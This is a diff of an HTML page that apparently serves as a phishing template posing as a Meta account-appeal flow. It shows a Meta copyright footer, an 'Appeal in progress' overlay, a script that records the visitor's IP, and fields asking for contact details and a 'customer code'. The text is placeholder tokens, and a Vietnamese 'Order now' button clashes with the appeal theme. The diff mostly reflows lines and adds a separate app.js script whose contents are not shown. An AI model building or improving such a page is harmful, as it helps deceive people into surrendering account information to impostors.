@@ -6,7 +6,6 @@
       window.dataLayer = window.dataLayer || [];
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());
-
       gtag('config', 'G-V7RH7T85NG');
     </script>
     <meta charset="UTF-8">
@@ -14,6 +13,7 @@
     <title data-i18n="page_title">bequora3</title>
     <link rel="stylesheet" href="style.css">
     <script src="/getIP.js" defer></script>
+    <script src="app.js" defer></script>
 </head>
 <body>
 
@@ -76,33 +76,18 @@
         <img src="banermau.jpg" class="banner" alt="Banner">
 
         <h2 data-i18n="step3_heading">bequora3</h2>
-        <p class="desc" data-i18n="step3_desc">
-            bequora4
-        </p>
+        <p class="desc" data-i18n="step3_desc">bequora4</p>
 
-        <input
-            type="text"
-            id="contact"
-            data-i18n-placeholder="contact_placeholder"
-            placeholder="bequora5"
-            autocomplete="on">
-
+        <input type="text" id="contact" data-i18n-placeholder="contact_placeholder" placeholder="bequora5" autocomplete="on">
         <p class="error" id="contactError"></p>
 
-        <input
-            type="text"
-            id="customerCode"
-            data-i18n-placeholder="bequora6_placeholder"
-            placeholder="bequora6"
-            autocomplete="off">
-
+        <input type="text" id="customerCode" data-i18n-placeholder="bequora6_placeholder" placeholder="bequora6" autocomplete="off">
         <p class="error" id="customerCodeError"></p>
 
         <button id="submitBtn" data-i18n="submit_btn">Đặt hàng ngay</button>
      
         <div class="custom-footer">
             <hr class="footer-divider">
-            
             <div class="footer-languages">
                 <a href="#">Italiano</a>
                 <a href="#">Deutsch</a>
@@ -112,16 +97,12 @@
                 <a href="#">Türkçe</a>
                 <a href="#">Français (France)</a>
             </div>
-
             <div class="footer-links">
                 <a href="#">Information</a>
                 <a href="#">Help Center</a>
                 <a href="#">More</a>
             </div>
-
-            <div class="footer-copyright">
-                Meta © 2026
-            </div>
+            <div class="footer-copyright">Meta © 2026</div>
         </div>
     </div>
 </section>
@@ -166,12 +147,9 @@
 <div class="loading-overlay" id="loadingOverlay">
     <div class="loading-box">
         <img src="logomau.png" class="loading-logo" alt="Logo">
-
         <div class="spinner"></div>
-
         <h3 id="loadingTitle" data-i18n="loading_title">Appeal in progress...</h3>
         <p id="loadingStatus" data-i18n="loading_status">✓ Your appeal is being submitted to bequora for review. This process may take a few moments.</p>
-
         <div class="brand">bequora@2026</div>
     </div>
 </div>
